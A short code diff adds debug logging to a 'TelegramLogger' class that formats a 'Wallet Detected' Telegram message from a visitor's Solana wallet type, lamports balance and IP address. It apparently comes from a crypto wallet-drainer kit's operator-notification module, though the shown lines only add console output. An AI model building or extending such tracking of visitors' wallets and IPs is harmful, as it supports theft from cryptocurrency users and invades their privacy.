@@ -111,10 +111,13 @@ class TelegramLogger {
       lamports: data.lamports,
       ip: data.ip
     });
+    console.log('[TELEGRAM] Wallet type for display:', walletType);
+    console.log('[TELEGRAM] Known wallet types:', ['Phantom', 'Solflare', 'Backpack', 'Glow', 'Trust Wallet', 'Exodus']);
 
     // Show wallet type if it's a known wallet type
     const knownWalletTypes = ['Phantom', 'Solflare', 'Backpack', 'Glow', 'Trust Wallet', 'Exodus'];
     const walletTypeDisplay = knownWalletTypes.includes(walletType) ? `💼 <b>Type:</b> ${walletType}` : '';
+    console.log('[TELEGRAM] Wallet type display:', walletTypeDisplay);
 
     const message = `
 <b>👛 Wallet Detected</b>
